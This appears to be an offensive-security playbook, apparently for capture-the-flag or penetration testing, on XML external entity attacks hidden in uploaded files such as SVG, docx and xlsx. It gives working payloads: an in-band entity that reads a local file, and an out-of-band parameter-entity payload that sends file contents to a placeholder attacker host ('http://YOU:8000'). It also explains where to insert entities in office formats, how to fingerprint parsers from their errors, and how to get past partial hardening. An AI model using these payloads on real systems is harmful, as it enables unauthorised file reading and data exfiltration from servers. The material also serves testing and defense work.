# XXE in Uploads — the file-carried entity attack

## The carrier map — which file types carry XML a parser will read

| Carrier | The XML part the parser reads |
|---|---|
| `.xml`/`.xsl`/`.xslt` direct upload | the file itself |
| `.svg` | the svg root |
| `.docx`/`.xlsx`/`.pptx` | `word/document.xml`, `xl/sharedStrings.xml`, `docProps/*.xml` |
| `.odt`/`.ods` | `content.xml`, `meta.xml` |
| `.epub` | `.opf`/`.xhtml` inside |
| `.rss`/`.atom` feed import | feed root |
| `.gpx`/`.kml` geo import | root |
| `.wsdl`/`.xsd` schema upload | schema root |
| `.musicxml`/`.mm` (mindmap) | root |
| `.dae` collada | root |
| `application/xml` or `text/xml` body | the body itself |

The XXE payload lives inside whichever XML part the parser touches —
`document-attacks.md`/`office-formats-deep.md` for insertion points;
`web-xxe` skill for entity grammar.

## The two canonical entities

```xml
<!-- in-band: needs the value to surface in a response -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]>
<r>&x;</r>

<!-- OOB: works when nothing reflects -->
<!DOCTYPE r [
  <!ENTITY % f SYSTEM "file:///flag">
  <!ENTITY % e "<!ENTITY ex SYSTEM 'http://YOU:8000/?d=%f;'>">
  %e;
]>
<r>&ex;</r>
```

`oob_listener serve --port 8000 --log hits.jsonl` — the hit carries the
exfil in the path.

## Where in a container the entity goes — insertion detail

### docx

`word/document.xml` — DOCTYPE on the root `<w:document>` + `<w:t>&x;</w:t>`
in a run. Or `docProps/core.xml` `<dc:title>&x;</dc:title>` — metadata
echoes on info endpoints.

### svg

DOCTYPE on `<svg>` — `<text>&x;</text>` renders the file content into the
image the app serves.

### xlsx

`xl/sharedStrings.xml` `<t>&x;</t>` — cell text.

### Any XML in any zip part

`[Content_Types].xml`, `_rels/.rels` — structural, rarely echoed — prefer
content-bearing parts.

## The "the text must surface" rule

In-band XXE only works if `&x;` reaches a visible field — a rendered text
node, a metadata echo, an error message ("entity value ..."), a
converted doc's text. If the app parses and discards, only OOB works.

## Parser detection — which errors reveal entity handling

- `undefined entity` — it parsed the DTD
- `entity resolution disabled`/`DOCTYPE is disallowed` — hardened parser
- `connection refused`/`timeout` on the OOB host — external fetch attempted
- Java `SAXParseException`, Python `xml.etree` errors, PHP libxml warnings —
  parser identified

## Defenses and the honest read

- `LIBXML_NONET`/`resolve_entities=False`/secure defaults on modern lxml/
  xml.sax → direct entities dead; OOB also dead
- disabling DOCTYPE entirely → dead
- older/loose parsers (POI with default DocumentBuilder, PHPWord,
  custom SimpleXML) → alive
- parameter-entity OOB escapes "external entity" restrictions that block
  only general entities — the `%` dance is the standard escape

## The chained shape — upload lands in a parse queue

Upload isn't parsed immediately — it's queued/imported later by an admin
or worker — the `oob_listener` hit proves the consumer ran even when the
upload response was silent.

## Falsifiers

- every XML part is parsed with entities disabled
- the file's XML is never parsed (stored verbatim, served raw)

## Output to record

- the part carrying the entity + the surface it surfaced through
- the OOB hit's verbatim log line for blind cases
